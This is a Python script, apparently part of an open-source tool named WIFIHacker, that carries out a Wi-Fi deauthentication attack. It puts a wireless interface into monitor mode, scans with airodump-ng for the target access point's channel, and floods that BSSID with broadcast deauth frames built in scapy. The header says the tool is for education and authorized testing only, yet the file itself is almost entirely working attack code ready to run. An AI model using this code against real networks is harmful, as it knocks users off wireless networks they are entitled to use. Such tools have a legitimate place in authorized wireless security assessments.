#!/usr/bin/env python

"""
WIFIHacker - Wireless Penetration Testing Tool
----------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : WIFIHacker - A tool for WiFi auditing, penetration testing, and security assessments.

License     : Open-source for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is meant strictly for educational, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you don’t own or have permission to test is illegal.
❗ If you use or modify this code, GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and against the open-source community principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.

"""

import os
import time
import subprocess
from scapy.all import *

def set_monitor_mode(interface):
    print(f"[+] Enabling monitor mode on {interface}...")
    subprocess.call(["airmon-ng", "check", "kill"])
    subprocess.call(["airmon-ng", "start", interface])
    return interface + "mon"

def get_channel(bssid, iface):
    print(f"[+] Scanning to find channel for BSSID: {bssid}")
    try:
        result = subprocess.check_output(["airodump-ng", iface, "-w", "/tmp/deauth_scan", "--output-format", "csv"], timeout=10)
    except subprocess.TimeoutExpired:
        pass  # We just want the file, not long scan

    try:
        with open("/tmp/deauth_scan-01.csv", "r") as f:
            lines = f.readlines()
            for line in lines:
                if bssid.upper() in line.upper():
                    parts = line.split(",")
                    return parts[3].strip()
    except FileNotFoundError:
        print("[!] Could not find scan results.")
    
    return None

def perform_deauth(bssid, iface, channel, count=0):
    print(f"[+] Setting {iface} to channel {channel}")
    os.system(f"iwconfig {iface} channel {channel}")
    
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    print(f"[+] Sending deauth packets to {bssid} on channel {channel} via {iface}")
    try:
        sendp(packet, iface=iface, count=count, inter=0.1, verbose=1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")

def start_deauth():
    os.system("clear")
    print("=== WIFIHacker | Deauth Attack Module ===")
    
    interface = input("[?] Enter wireless interface (e.g., wlan0): ").strip()
    bssid = input("[?] Enter target BSSID (MAC of AP): ").strip()
    
    monitor_iface = set_monitor_mode(interface)
    channel = get_channel(bssid, monitor_iface)
    
    if channel is None:
        print("[!] Could not detect channel. Please enter manually.")
        channel = input("[?] Channel: ").strip()

    perform_deauth(bssid, monitor_iface, channel)

    print("\n[+] Done.")

if __name__ == "__main__":
    start_deauth()
